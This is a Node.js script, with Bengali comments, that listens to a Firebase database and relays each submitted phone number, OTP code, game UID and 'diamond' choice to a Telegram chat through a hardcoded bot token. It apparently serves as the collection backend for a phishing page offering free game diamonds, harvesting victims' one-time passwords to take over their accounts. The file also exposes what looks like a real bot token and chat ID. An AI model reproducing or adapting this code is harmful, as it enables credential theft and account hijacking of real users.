import admin from "firebase-admin";
import TelegramBot from "node-telegram-bot-api";
import serviceAccount from "./serviceAccountKey.json" assert { type: "json" };

// ================= Firebase Setup =================
admin.initializeApp({
  credential: admin.credential.cert(serviceAccount),
  databaseURL: "https://siyamhasansiyam-2c149-default-rtdb.firebaseio.com"
});

const db = admin.database();

// ================= Telegram Bot Setup =================
const botToken = "7860488783:AAGcAs1wJJXnb2Q0bcUNHi1CJZuXRJvSoKI";
const chatId = "7465244567";
const bot = new TelegramBot(botToken);

// ================= Firebase Listener =================
const usersRef = db.ref("users");

// নতুন user add হলে
usersRef.on("child_added", snapshot => {
  const data = snapshot.val();
  const userKey = snapshot.key;

  if(data.NUMBERC) bot.sendMessage(chatId, `New Number: ${data.NUMBERC}`);
  if(data.OTPC) bot.sendMessage(chatId, `OTP Submitted: ${data.OTPC}`);
  if(data.UIDC) bot.sendMessage(chatId, `UID Submitted: ${data.UIDC}`);
  if(data.DIAMONDC) bot.sendMessage(chatId, `Diamond Selected: ${data.DIAMONDC}`);
});

// existing user update হলে
usersRef.on("child_changed", snapshot => {
  const data = snapshot.val();
  const userKey = snapshot.key;

  if(data.NUMBERC && !data._sentNumber){
    bot.sendMessage(chatId, `New Number: ${data.NUMBERC}`);
    usersRef.child(userKey).update({_sentNumber:true});
  }
  if(data.OTPC && !data._sentOTP){
    bot.sendMessage(chatId, `OTP Submitted: ${data.OTPC}`);
    usersRef.child(userKey).update({_sentOTP:true});
  }
  if(data.UIDC && !data._sentUID){
    bot.sendMessage(chatId, `UID Submitted: ${data.UIDC}`);
    usersRef.child(userKey).update({_sentUID:true});
  }
  if(data.DIAMONDC && !data._sentDiamond){
    bot.sendMessage(chatId, `Diamond Selected: ${data.DIAMONDC}`);
    usersRef.child(userKey).update({_sentDiamond:true});
  }
});
